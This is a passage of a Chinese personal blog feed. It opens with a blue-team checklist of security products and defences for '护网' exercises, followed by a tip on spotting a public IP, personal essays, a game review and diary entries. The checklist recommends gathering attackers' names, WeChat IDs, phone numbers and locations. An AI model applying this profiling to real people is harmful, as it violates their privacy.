title="值得关注的安全产品:"></a>值得关注的安全产品:</h3><p>HIDS:服务器端点侧信息采集与异常监测。重点关注:资产（IP、操作系统、组件、帐号)、后门检测、webshell检测、弱口令检测、高危端口检测、异常登录检测、异常命令检测、异常进程检测…<br>NTA:网络流量解析与监测分析。重点关注:扫描探测、Oday漏洞攻击、webshell上传、webshell利用、木马&#x2F;后门、异常连接、隐蔽隧道、威胁情报、暴力破解、口令猜解…<br>WAF:应用侧攻击监测与阻断。重点关注:各类注入、绕过、未授权访问、反序列化、溢出、目录遍历、信息泄露…<br>蜜罐:欺骗攻击者的各种技术手段。重点关注:WAF引流、蜜罐应用、蜜罐主机（关键区域)、蜜罐AD帐号、蜜罐wiki、蜜罐VPN、蜜罐FTP、蜜罐集权应用、蜜罐数据&#x2F;文件、蜜罐客户端、溯源…<br>告警&#x2F;日志分析:对告警和日志的分析工具。重点关注:资产快速定位、日志接入、日志解析、日志存储、日志快速查询、日志导出…<br>总结:纵深+诱骗+分析，全面覆盖+重点部署，规则快速配置+快速分析定位。</p><h3 id="护网中值得关注的前置防护手段"><a href="#护网中值得关注的前置防护手段" class="headerlink" title="护网中值得关注的前置防护手段"></a>护网中值得关注的前置防护手段</h3><p>IP封堵:如何在防火墙和WAF上快速的封堵IP，最好自动化，注意解封时间的设定…<br>钓鱼演练:至少三轮集中钓鱼演练，通知+不通知，链接+附件+伪造邮件头+内容欺诈…<br>非关键应用提前下线:梳理资产，提前下线非关键应用，顺带下线内部wiki、闲置主机…<br>关键、集权应用、AD监控:梳理AD、集权应用和关键应用，增加对应的监控手段，部署蜜罐应用或帐做好应急事件处置策略…<br>告警收敛:提前制定规则，避免遭到告警洪流，内部测试最好停止，增加白名单，最好发版管控…<br>权限收敛:办公、测试、生产间的访问权限收敛，避免开大策略<br>加强监控,可考虑报备机制…<br>xff配置:负载均衡一定要配置xff，否则告警没法看到真实IP…<br>信息收集:针对攻防平台、攻击队人员和厂商支援力量的信息收集，包括但不限于:姓名、微信号、手机号、ID、IP地理位置、IDC机房IP段、网络测绘、常见攻防工具、攻击偏好…</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;写了30道，才发现在网上找的面试题是蓝队的，而且还是流传了好久以前的，我都不知道咋说了。只能说大意了吧。&lt;/p&gt;</summary>
    
    
    
    <category term="护网" scheme="http://example.com/categories/%E6%8A%A4%E7%BD%91/"/>
    
    <category term="面试" scheme="http://example.com/categories/%E6%8A%A4%E7%BD%91/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="护网" scheme="http://example.com/tags/%E6%8A%A4%E7%BD%91/"/>
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>判断一个IP是否为公网IP</title>
    <link href="http://example.com/2023/03/11/%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AAIP%E6%98%AF%E5%90%A6%E4%B8%BA%E5%85%AC%E7%BD%91IP/"/>
    <id>http://example.com/2023/03/11/%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AAIP%E6%98%AF%E5%90%A6%E4%B8%BA%E5%85%AC%E7%BD%91IP/</id>
    <published>2023-03-10T16:00:00.000Z</published>
    <updated>2023-03-11T03:19:05.589Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有时需要一个公网ip，但是不知道自己的IP是否为公网IP，由于老是会忘掉怎么判断，不如自己记录一下。</p><span id="more"></span><h1 id="IP之间的区别"><a href="#IP之间的区别" class="headerlink" title="IP之间的区别"></a>IP之间的区别</h1><p>内网IP：只能在限定区域内访问，外网无法识别。<br>大内网IP：假设是联通带宽，则分配IP只能在联通内访问，移动电信网络均无法访问。<br>公网IP：全球唯一IP地址，在任何地方均可访问。</p><h1 id="Tips-1-IP地址范围"><a href="#Tips-1-IP地址范围" class="headerlink" title="Tips 1:IP地址范围"></a>Tips 1:IP地址范围</h1><p>以下IP段范围均为私网IP地址：</p><ol><li>10.0.0.0-10.255.255.255</li><li>192.168.0.0-192.168.255.255</li><li>172.16.0.0-172.31.255.255</li></ol><h1 id="Tips-2-咨询网络服务商"><a href="#Tips-2-咨询网络服务商" class="headerlink" title="Tips 2:咨询网络服务商"></a>Tips 2:咨询网络服务商</h1><p>如果不确定自身IP是否为公网IP，那么可以咨询客服。<br>如果确定不是公网IP，那么向客服要求开通公网IP。</p><h1 id="Tips-3-IP对比法"><a href="#Tips-3-IP对比法" class="headerlink" title="Tips 3:IP对比法"></a>Tips 3:IP对比法</h1><p>首先查看自身IP：使用cmd的ipconfig&#x2F;all命令，查看正在连接的ipv4地址。<br>然后在<a href="https://www.whatismyip.com/">whatismyip</a> 或 <a href="https://www.ipchicken.com/">ipchicken</a> 查看IP，比对是否一致。<br>如果一致，则说明IP为公网ip，否则不是。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>物以稀为贵，公网IP更好，但也要看自身需求。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;有时需要一个公网ip，但是不知道自己的IP是否为公网IP，由于老是会忘掉怎么判断，不如自己记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="IP" scheme="http://example.com/categories/IP/"/>
    
    
    <category term="IP" scheme="http://example.com/tags/IP/"/>
    
  </entry>
  
  <entry>
    <title>浮</title>
    <link href="http://example.com/2023/03/09/%E6%B5%AE/"/>
    <id>http://example.com/2023/03/09/%E6%B5%AE/</id>
    <published>2023-03-08T16:00:00.000Z</published>
    <updated>2023-03-09T16:56:12.378Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/RainGlass.png" alt="Rain"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>“浮”是一种糟糕的人生状态，绝大多数人或多或少都有过这种状态，只不过有的人天生不是浮在水面的生物，只是暂居水面。有的人一辈子只能浮在水面上，无论他甘心与否。</p><h1 id="说文解字"><a href="#说文解字" class="headerlink" title="说文解字"></a>说文解字</h1><p>首先看，浮这个字，可以组成的词有：浮躁、浮萍、浮夸、浮生、浮华等等，虽然也有少量中性或是褒义的词，但大多数还是贬义的形容。然后，“浮”对于不会游泳的生物而言是一个危险的词，因为当不会游泳的生物在没有外力的作用下，浮在水面上通常是由于死亡，此外鱼儿在死亡后也会浮在水面上。最后，我认为“浮”从抽象意义上表现一个人既不能自由地翱翔在天空中，上九天揽月；也不能漫步水底，下五洋捉鳖。“浮”带给我的始终是不上不下，高不成低不就的一种感觉。“浮”这个字从我的角度来看，它代表了一种不稳定、不安全、不满足、缺乏主动性和责任感的状态，可能会让一个人感到烦躁、迷茫、空虚。</p><h1 id="“浮”的大多数"><a href="#“浮”的大多数" class="headerlink" title="“浮”的大多数"></a>“浮”的大多数</h1><p>不可否认的是，大多数人都是处于“浮”的状态的，能遨游天际抑或是潜入海底的终究是少数。<br>我对人性是持悲观态度的，同时我又是宿命论的支持者，因此我对于“浮”的状态的人更多批判而更少同情。我相信有些鸟儿是注定不会被关在牢笼里的，它们的每一片羽毛都闪耀着自由的光辉。不能从“浮”的状态中脱离出的人，可能一辈子都无法脱离，命运不能改变。<br>有些人往往向往着崇高，却自由地选择卑劣。处在“浮”的状态中的人，大多数并不是不自知，而是知道了选择逃避，或许有想过挣扎，蹦跶了几次后，没有成功最终放弃。处于“浮”的状态的人，没有改变的决心。“浮”绝不是一种自由的体现，因为自由不能以彻底放弃自由为代价！<br>正如我之前的一篇文章中所写，道理充斥的时代，我们缺少觉悟。不论什么样的觉悟都可以，单纯是不想将这个世界让给讨厌的人也好，拯救苍生也好。觉悟不分贵贱，只在程度深浅。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>讨论写出的文章，时间紧迫，没做修改，凑合着看看。以后有机会再回来改~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/RainGlass.png&quot; alt=&quot;Rain&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>骗子随想二三事</title>
    <link href="http://example.com/2023/03/08/%E9%AA%97%E5%AD%90%E9%9A%8F%E6%83%B3%E4%BA%8C%E4%B8%89%E4%BA%8B/"/>
    <id>http://example.com/2023/03/08/%E9%AA%97%E5%AD%90%E9%9A%8F%E6%83%B3%E4%BA%8C%E4%B8%89%E4%BA%8B/</id>
    <published>2023-03-07T16:00:00.000Z</published>
    <updated>2023-03-09T01:19:36.492Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>被骗后只懂得生气的人根本不成对手，应该要懂得佩服这种手法，才算是真正的商人。</p><h1 id="骗子的定义"><a href="#骗子的定义" class="headerlink" title="骗子的定义"></a>骗子的定义</h1><p>骗子这个词，是用来形容一个比较糟糕的人的说法。人活在世上，很难一次都不说谎，也不是只要说谎，我们就认为一个人是骗子，如果这样，那么恐怕世界上绝大多数人都是骗子。我想，骗子这个词，适合形容因说谎带给人比较重的伤害的人。<br>判定一个人是否为骗子，我们可以唯目的论，唯结果论。<br>所谓唯目的论，就是看一个人说谎的动机或目的是什么，如果目的或动机是为了自身利益或是损害他人，无论最终给被骗人带来了好处还是坏处，都被认为是骗子。唯结果论，就是看一个人说谎后造成的结果是好的还是坏的，如果结果给被骗人带来了坏处，无论说谎的动机或目的是什么，都被认为是骗子。<br>世界并非只有二象性，而是包罗万象，自然也不能仅仅唯目的论或是唯结果论，对于不同的人判定一个人的标准也不同。我们应该综合考虑说谎的人的意图、行为、后果和责任，以及被欺骗的人的感受、权利、利益和伤害，才能做出一个公正合理的判断。也即综合分析，折中判断，得出最具有信服力的结论。</p><h1 id="被骗后的态度"><a href="#被骗后的态度" class="headerlink" title="被骗后的态度"></a>被骗后的态度</h1><p>我想，被骗的人没有足够的警惕性和判断力，又或许是因为他们对自己的能力和信心过于自信。每个人都有不成熟的时候，这种不成熟可能是自身的心性不成熟，可能是自身的知识不成熟，可能是条件不成熟等等，不管怎样，不成熟的人往往容易被骗。<br>如果一个人在被骗后，只懂得生气、愤怒、咒骂等等，那么他们很难从一件事上获得更多的教训，下次遇到其他类似的事，可能又会跌倒。而懂得佩服骗子手法的人有更开放和包容的心态，有更强的学习和进步的欲望，所以在遇到骗局时能够从中吸取教训和经验。这两类人对比之下，高下立判。</p><p>不仅仅是被骗后的态度，说得更宽泛一点，也是面对人生中不幸事件的态度。只是停留在恼怒，停留在对一个事情表面认识的人，是不会取得成就与智慧的。我们需要透过现象看本质，彻底理解每个现象背后本质的异同。</p><p>拿自己曾经被骗的经历来说：有人曾对我设了一个骗局，他在匿名平台上主动找我私聊，以暴利诱惑我，将钱投入到一个新发行的虚拟货币中，投入后钱全都取不出来，最后导致全数被坑，人也消失的无影无踪。就从这个经历上，我打心里明白了“无利不起早”。一个让人掏出钱或拿出什么利益的人，背后都有自己的动机或目的，有时表面上看似不会让对方受益，或许只是自己没有抓住那条隐藏的利益链。说谎的重点不是在内容本身，而是在于为什么要说谎。并且，说谎是否有代价，这样的代价是否值得人铤而走险。如果当时是在一个实名注册的平台上或是我认识他，或许对方就不会冒这样的风险吧。正是由于在匿名平台上，说谎的代价几乎为0，骗到与否，都不会给他带来难以承受的代价，因此才敢于欺骗。最后一点是我当时对于虚拟货币还不甚了解，只是单纯贪图利益就加入了。如果我了解得多一些，知道了这种骗局的存在，也不会被骗。总的来说，就是四点：一是对人心认识不够，二是没意识到说谎的代价很低，三是对骗局内的事物不了解，四是自己的利欲熏心。</p><h1 id="“聪明”的骗子"><a href="#“聪明”的骗子" class="headerlink" title="“聪明”的骗子"></a>“聪明”的骗子</h1><p>一个能够完整设计出骗局并成功实施的骗子，那么至少能说明这个骗局逻辑上基本没有漏洞，较好地与某样实际的事物相结合（比如虚拟货币），能激发出人内心的贪欲，最终挑选的对象还正好合适，这些条件缺一不可。我想，从这个层面而言，骗子是比被骗的人聪明且努力的。正是因为被骗人的怠惰，给了骗子钻漏洞的机会。从来只有聪明人能设计骗局骗到蠢人，而没有反过来的。某种意义上可以说，被骗的人应当向骗子学习，不单是学习怎么防止被骗，也要学习那种努力思考的精神。否则，虽然在道德上胜过了骗子，在精神上却落后一大截。五十步笑百步，又有什么瞧不起骗子的资格呢？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Holo.png&quot; alt=&quot;Holo&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>有关与无关：中国人的误区</title>
    <link href="http://example.com/2023/02/28/%E6%9C%89%E5%85%B3%E4%B8%8E%E6%97%A0%E5%85%B3%EF%BC%9A%E4%B8%AD%E5%9B%BD%E4%BA%BA%E7%9A%84%E8%AF%AF%E5%8C%BA/"/>
    <id>http://example.com/2023/02/28/%E6%9C%89%E5%85%B3%E4%B8%8E%E6%97%A0%E5%85%B3%EF%BC%9A%E4%B8%AD%E5%9B%BD%E4%BA%BA%E7%9A%84%E8%AF%AF%E5%8C%BA/</id>
    <published>2023-02-27T16:00:00.000Z</published>
    <updated>2023-02-28T02:40:45.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>总要夜深人静之时才有想写的欲望。</p><span id="more"></span><h1 id="联系的强与弱"><a href="#联系的强与弱" class="headerlink" title="联系的强与弱"></a>联系的强与弱</h1><p>一个人与任何一件事物之间，有关是绝对的，无关是相对的。大到宇宙，小到个人。<br>只不过，通常来说，在地球上离我们越远的事物关联越少。离我们越近的事物关联越大。很多时候，人们对稍微离自己远一点的东西，就会说与我无关。确切地说，并非无关，而是联系比较微弱，在权衡利弊得失后放弃了花精力去处理这段关系。<br>俗话说，压死骆驼的最后一根稻草。微弱的联系大多时候不会表现出什么，但积蓄到一定程度也可能量变引起质变。当然我也不是说因为万物皆有联系所以什么都要关注，眼观六路耳听八方。那肯定不至于，人的精力是有限的，一般而言，肯定要先把精力集中在重要的事物上，有余力再去关注次要的事物。</p><h1 id="大多数中国人认为无关的问题–税"><a href="#大多数中国人认为无关的问题–税" class="headerlink" title="大多数中国人认为无关的问题–税"></a>大多数中国人认为无关的问题–税</h1><p>在中国聊起税，很多人都不怎么当回事儿，仿佛这种事同自己毫无关联。而实际上自己只要在中国有消费有收入，都是交了税的。我们极端一点，用暴力计算法，假如按税占消费收入的8%，假如从出生到18岁成年，消费在自己身上的有一百万，那么有8万都是被政府拿走了。<br>8万块钱，如果是被偷被骗意外损失了之类的，那么很可能会难过愤怒好一阵子。可是，当这笔钱被政府十多年来一点点偷偷拿走，很多人却没有任何感觉。这不是很讽刺吗？<br>或许有人会觉得，啊，取之于民，用之于民。收了税给人民带来福利，什么医保社保，什么基建工程，什么补贴政策等等。说白了只是政府把人民的钱汇聚起来办大工程，人民个人力量无法做到的事，由政府作为中间人去组织协商解决，政府本身并不产生任何资金效益，一切的钱财都来源于人民。<br>这一切看似都很美好，实则不然。有人做过一个统计，中国的福利待遇仅有8%，就按上面的8万计算，7万多的钱都不翼而飞了，这些钱都进了不同人的腰包里。算是人民孝敬“老爷”了<br>之前身边一人，我同对方说某某乌纱帽每年用十亿花天酒地。对方却不以为然，说这和我们有什么关系呢？我听后其实心里还是蛮诧异的，这怎么会没关系，自己交的税被别人随意拿来买奢侈品、保时捷之类的。难道不感到气愤吗？举个简单例子，我毫无理由直接叫你拿500给我买件衣服，会同意吗？那只要不是亲属绝大多数都不会吧。具有此等常识的我们却能纵容那些与我们素不相识的陌生人随意地花我们自己的钱，这逻辑不奇怪吗？<br>或许有人说，一个平民百姓，能有什么办法呢？的确，我们短期内做不到什么实质性的报复打击之类的。可这是我们毫无感触的理由吗？国外平民有一个常用来自称的词叫做纳税人，不过中国人却不怎么会意识到这一点，自己常常缴税，不是国家的主人，反而同奴隶孙子般窝囊，也实在悲哀。</p><h1 id="大多数中国人认为无关的事–政治"><a href="#大多数中国人认为无关的事–政治" class="headerlink" title="大多数中国人认为无关的事–政治"></a>大多数中国人认为无关的事–政治</h1><p>很多人不喜欢政治，这是正常的事。但因认为政治与自己无关，那是认知狭隘或愚昧浅薄。<br>恰恰相反，政治与每个人息息相关，可谓是非常重要，不喜欢政治可以，很正常。但不关注政治只能说明对政治的认识程度恐怕仅仅是停留在政客勾心斗角那一套等等。<br>政治代表了一个国家运作的逻辑与方向，无论什么方向，在中国各行各业各个领域应有具有。上海交大高校的党委书记是副部级，大一点的企业也设有党支部。比如，前两年曾发布过一个“双减政策”。这个政策一出顿时炸开了锅，大多数人都是看热闹，事不关己高高挂起。毕竟自认为与己无关嘛。但事实上，这怎么可能无关呢？培训机构，那要赔本儿了。教师群体，钱要少赚了。学生群体，提成绩更难了。家长群体，补习花费更多了。与广泛民众有着重要关联，可见政治重要性。<br>无论身处哪个国家，关注政治必不可少。不理解国家运行的逻辑和方向，就不可能从全面的角度看待一个国家。那也永远只能身处井底，看到片面的天空。</p><h1 id="大多数中国人认为有关的事–国外"><a href="#大多数中国人认为有关的事–国外" class="headerlink" title="大多数中国人认为有关的事–国外"></a>大多数中国人认为有关的事–国外</h1><p>一听到美国爆出了什么新闻，那顿时炸开了锅。是国外的负面事件即欢欣鼓舞，是国外的正向事件即唏嘘不已。<br>其实我真不明白，一天天关注国外的事干什么？自己哪国人，不应当首先关注了解自己国家的正面负面消息吗？其它国家出了什么事，甭管好坏，难道这个关联程度还能比自己国家的更大？也不会真有人觉得自己国家的破事儿比其它国家少吧。舍近求远，舍本逐末，乃是愚蠢表现。<br>至于当自己国家曝出什么负面消息时，民众言论带着“其它国家也这样啊”这种话的人，我想说，国家是拿来比烂的吗？不想着怎么更好，反而是互相比烂，觉得做得不错啦，有些事情是无法避免的……抱着这些想法的人，我个人是坚决反对的。<br>当然，人微言轻，改变一个人很难，也不是教育家，只是想写下来，坚定自己的观点与看法罢了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;总要夜深人静之时才有想写的欲望。&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>《空洞骑士》：一场探索未知迷宫的沉浸式体验</title>
    <link href="http://example.com/2023/02/24/hollow_knight/"/>
    <id>http://example.com/2023/02/24/hollow_knight/</id>
    <published>2023-02-23T16:00:00.000Z</published>
    <updated>2023-02-24T03:02:16.729Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Hollow_Knight_1.jpg" alt="Hollow Knight"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初玩时不觉得，越玩越有味道。<br>空洞骑士真乃神作也。</p><h1 id="逐渐深入的乐趣：空洞骑士的游戏设计"><a href="#逐渐深入的乐趣：空洞骑士的游戏设计" class="headerlink" title="逐渐深入的乐趣：空洞骑士的游戏设计"></a>逐渐深入的乐趣：空洞骑士的游戏设计</h1><p>起初玩空洞骑士，感觉只是一款单一的游戏。一开始没有疾跑，只有走，回血，攻击。可谓是让人感觉略显单薄。<br>由于这款游戏在steam上好评率非常高，并且许多人把它称之为神作，再加上看过一些游戏片段，知道后面会变得丰富后，我耐着性子玩了下去。<br>初期阶段的我什么都不懂，只知道打怪，东走走西走走，因为不知道自己要达成什么目标，所以显得如无头苍蝇般无所适从。于是看了看攻略视频。<br>之后，慢慢地，有了冲刺，有了爬墙，有了冲击波……我感觉操作丰富了起来。我也不再需要攻略，摸索地图有了自己的路线，打怪走路有了自己的节奏，甚至有了自己刷金币的方式。一点一点充实背包，一点一点扩大地图，探索未知的好奇，让我心情愉悦。</p><h1 id="享受迷宫探索：手残党的空洞骑士游戏体验"><a href="#享受迷宫探索：手残党的空洞骑士游戏体验" class="headerlink" title="享受迷宫探索：手残党的空洞骑士游戏体验"></a>享受迷宫探索：手残党的空洞骑士游戏体验</h1><p>我自己算是手残党吧，能为了过一个地方花上一小时，为了打败一个boss死好多次。因此同等情形下游玩时间也比别人多，不过我并不在意，我享受这个过程。我就像是真正处于一个未知幽深的迷宫中，带着好奇心与勇气，谨慎却不失大胆。会提心吊胆地走在未知领域，也会为了丢失一千多吉欧而懊恼不已，会为了打败boss而兴奋不已，也会为了强敌而选择逃离。这是一个享受的过程。</p><h1 id="攻略指引启蒙：游戏探索中攻略和沉浸的平衡"><a href="#攻略指引启蒙：游戏探索中攻略和沉浸的平衡" class="headerlink" title="攻略指引启蒙：游戏探索中攻略和沉浸的平衡"></a>攻略指引启蒙：游戏探索中攻略和沉浸的平衡</h1><p>没搞清楚游戏的玩法前，可以看看攻略启发游玩方式。毕竟有时不看攻略某些操作是真不知道怎么做（比如下劈能往上弹）。弄清楚游戏的玩法后，就完全没必要看攻略了（除非卡关）。沉浸式体验其中，那才是最重要的。</p><h1 id="完美融合：空洞骑士的艺术设计与游戏机制"><a href="#完美融合：空洞骑士的艺术设计与游戏机制" class="headerlink" title="完美融合：空洞骑士的艺术设计与游戏机制"></a>完美融合：空洞骑士的艺术设计与游戏机制</h1><p>以上说的还是玩法的部分，其游戏的美术画面音乐部分也是非常具有风格，操作按键之类也非常流畅自然。甚至隐隐有只狼那种拼刀的感觉。而这，仅仅是2017年发布的一款2D类动作冒险游戏。<br>这款游戏无愧于神作！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看steam评论区游玩时长大多是60h以上，甚至不乏二百小时的，而我目前才十多小时，看来距离通关还有很久…<br>听说第二部《丝之歌》快要出来了，非常期待~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Hollow_Knight_1.jpg&quot; alt=&quot;Hollow Knight&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="game" scheme="http://example.com/categories/game/"/>
    
    
    <category term="game" scheme="http://example.com/tags/game/"/>
    
    <category term="recommend" scheme="http://example.com/tags/recommend/"/>
    
  </entry>
  
  <entry>
    <title>谁最可靠</title>
    <link href="http://example.com/2023/02/20/Diary_20230220/"/>
    <id>http://example.com/2023/02/20/Diary_20230220/</id>
    <published>2023-02-19T16:00:00.000Z</published>
    <updated>2023-02-20T17:52:00.188Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Holo_8.png" alt="Holo"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个人的一生有许多关系。亲人，亲戚，朋友，熟人，伴侣……谁是最可能可靠的呢？</p><h1 id="亲人之间"><a href="#亲人之间" class="headerlink" title="亲人之间"></a>亲人之间</h1><p>我们最开始也是最常见的亲人，无疑就是爷爷奶奶外公外婆父母兄弟姐妹了。<br>父母大了我们一代，爷爷奶奶外公外婆大了我们两代，阅历必然是要高于我们的，也有一代人独特的认知。因出生时代的不同，所处立场的不同，教育能力的不足等等，大多数父母无法对待孩子像对待朋友那样。也即长辈很难真正意义上与孩子交心，隔阂自然也是有的。<br>年龄相差过大的兄弟姐妹大多也会有类似的情况。但年龄较为接近的兄弟姐妹之间就要好得多了。</p><p>亲人是我们来到这个世界上产生的第一类亲密关系。这类亲密关系建立起来最根本的原因就是血缘。无论父母起初是以怎样的心情对待孩子，在朝夕相处的时光中，相互之间蕴含的感情也会慢慢增加。如果作为长辈的亲人给予孩子的负面情感与正面情感相差不远甚至负面比正面多，那么父母与孩子之间很难建立稳固的关系。彼此之间或许也不会认为对方是可靠的存在。</p><p>当然，每个人所处的情况不尽相同。不知他人境遇，也莫言是非论调。总的来说，我认为，在一个家庭中主要由对方造成的负面影响（比如家暴、虐待、欺骗等）没有达到自己有点难以承受的地步，彼此之间的关系应当还是能稳定存在的。在这个前提下，亲人之间的联系应当建立在较高层面，只要不是做了过分的事，不应轻易被动摇。</p><h1 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Holo_8.png&quot; alt=&quot;Holo&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>道理与觉悟：为什么现代人看起来越来越聪明，却越来越难以理解“道理”？</title>
    <link href="http://example.com/2023/02/19/Diary_20230219/"/>
    <id>http://example.com/2023/02/19/Diary_20230219/</id>
    <published>2023-02-18T16:00:00.000Z</published>
    <updated>2023-02-19T07:27:47.057Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/1.png" alt="yuru camp"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>于个体而言，当一种事物从稀有变得泛滥后，即便本身没有改变，价值也会大大降低。</p><h1 id="哲学与道理"><a href="#哲学与道理" class="headerlink" title="哲学与道理"></a>哲学与道理</h1><p>每个人都有自己的哲学，听起来哲学这个词似乎高大上，说得通俗易懂的方式，哲学其实就是生活方式。选择什么样的哲学，就是选择怎样的生活方式。而道理，实际上就是哲学的碎片。无论教育如何，去思考哲学的人始终为少数。人生在世，如果一个人还有余裕，那么往往会去思考未来，思考怎样生活，思考这个世界。人追求这些，却又不愿深思哲学，于是有了介于二者之间的“道理”。</p><h1 id="泛滥的道理"><a href="#泛滥的道理" class="headerlink" title="泛滥的道理"></a>泛滥的道理</h1><p>动物的“历史”是铭刻在基因里的，由环境决定出来的生活方式，什么样的环境下决定了什么样的生活方式。人，除了拥有基因中的历史，还拥有了自己决定的一套历史，虽然这套历史并不完整，可相较于其它动物，已经是决定性的差距了。正因有了这套历史，才能如接力棒一样，把一代代人的心血带到现在，从前人的基础上造起一座座高楼大厦。</p><p>说到这里，想起最近看了一部鱼豊所创作的日本漫画《地。-关于地球的运动-》。这部漫画讲述了15世纪欧洲，C教盛行，天动说（又称地心说）是解释天体运动的唯一理论，被视为真理。试图推翻天动说的人全部都会被教会视为背逆上帝的异端，落得遭受拷问，甚至火刑的下场。在如此艰辛的情况下，有一个人为了追寻真理，隐蔽地维系、完善地动说（又称日心说）的研究，并在自己临终之际，将发扬地动说，撼动天动说的微小希望，寄托到下一个有同样志向的人。下一个人接着把自己的生命奉献给地动说，又将微小的希望再传承下去。</p><p>人类在自己创造的历史中，保存了各种各样的东西，其中也有许许多多的道理。从古至今，一代代人所思考而保留下来的道理，直至现代，已变得非常多了。有中国的儒家道家乃至百家争鸣，有西方苏格拉底柏拉图乃至后世黑格尔尼采等等。世界不乏道理，而实际上，进入二十一世纪以来，哲学的发展相较古代，有进展的内容是相当少的，举一个简单的例子，在信息不发达的古代，我们能有印象的哲学家不在少数，而现代信息那么发达的现在，能说出口的哲学家又有几个呢？现代的所谓哲学家大多不过是总结前人遗留的结晶，再在其中增加一点自己的理解。形形色色的道理，便更是如此了。</p><p>于是，道理便泛滥了。可即便如此之多的道理留到现在，人们有变得更智慧吗？我想并没有，愚昧的人照样愚昧。</p><h1 id="稀有的觉悟"><a href="#稀有的觉悟" class="headerlink" title="稀有的觉悟"></a>稀有的觉悟</h1><p>那么为什么古代思考出道理的人，却比现在道理泛滥的人更有智慧呢？我想其实很简单，因为思考出一个道理与觉悟是配套的。在古代，没有那么多道理可以了解，很多道理都是自己思考出的，正因这是自己产生的，道理与觉悟之间就如骨与肉的关系，紧密相连。</p><p>现代人的道理泛滥，随处可见。如果用一个更现代的词来表达，那就是“心灵鸡汤”。之前说过，道理实际上是哲学的碎片，这世上道理如此之多，其中不乏有看起来互相矛盾的，正是人们不愿深思，也就只能初见其惊艳，再看到了其它道理时无法区分这些道理的共性与不同之处，只能停留在浅薄的认识之中。只知道理，不具备觉悟，这并不会有多少意义。</p><p>觉悟，不是人能通过看看名言警句就能获得的，不是人能通过简单学习就能获得的。对于现代的人类而言，觉悟的获得，还具有不确定性。有的人会因重大打击而具备觉悟，有的人会因思考而具备觉悟。拥有觉悟就像武侠小说中打通任督二脉，突破了看不见的自身的桎梏，而具备觉悟。觉悟的获得在目前人类的历史中没有一个明确的方法，也就造成了其稀有。正是稀有，得以体现其价值。</p><h1 id="Chat-GPT3-0的回答"><a href="#Chat-GPT3-0的回答" class="headerlink" title="Chat GPT3.0的回答"></a>Chat GPT3.0的回答</h1><p>这个AI确实非常有趣，无论同它说什么，都能对答如流。我想这是颠覆了我们传统认知的AI，或许，在未来，这是历史上浓墨重彩的一笔。</p><h2 id="关于哲学与道理"><a href="#关于哲学与道理" class="headerlink" 